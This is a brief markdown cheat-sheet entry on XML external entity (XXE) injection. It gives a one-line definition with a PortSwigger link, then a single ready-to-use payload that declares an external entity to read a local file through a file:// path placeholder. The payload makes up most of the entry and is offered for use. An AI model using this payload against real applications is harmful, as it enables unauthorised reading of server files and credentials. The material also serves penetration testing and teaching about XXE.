# XXE payloads

[XML external entity injection (also known as XXE)](https://portswigger.net/web-security/xxe) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data.

## Payloads

Show a file.
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file://[PATHTOFILE]'>]>
<root>&read;</root>
```
